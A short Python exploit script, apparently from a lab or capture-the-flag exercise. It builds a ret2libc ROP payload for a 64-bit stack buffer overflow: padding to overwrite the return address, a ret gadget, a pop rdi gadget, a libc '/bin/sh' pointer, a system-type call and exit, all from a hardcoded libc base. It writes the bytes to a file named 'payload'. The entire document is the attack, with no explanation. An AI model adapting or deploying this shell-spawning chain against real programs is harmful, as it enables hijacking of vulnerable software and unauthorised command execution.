#!/usr/bin/python

import struct, os, sys

libc_base_address = 0x00007ffff7dd1000
shell = libc_base_address + 0x1b45bd
syscall = libc_base_address + 0x52290
exitcall = libc_base_address + 0x46a40
pop_rdi = libc_base_address + 0x0000000000023b6a
ret = libc_base_address + 0x0000000000022679

buffer = b"A"*208
buffer += b"B"*8

# struct.pack('<Q, memory address') <Q double long little-endian

buffer += struct.pack('<Q', ret)
buffer += struct.pack('<Q', pop_rdi)
buffer += struct.pack('<Q', shell)
buffer += struct.pack('<Q', syscall)
buffer += struct.pack('<Q', exitcall)

# buffer += b"C"*6

with open('payload', 'wb') as payload:
	payload.write(buffer)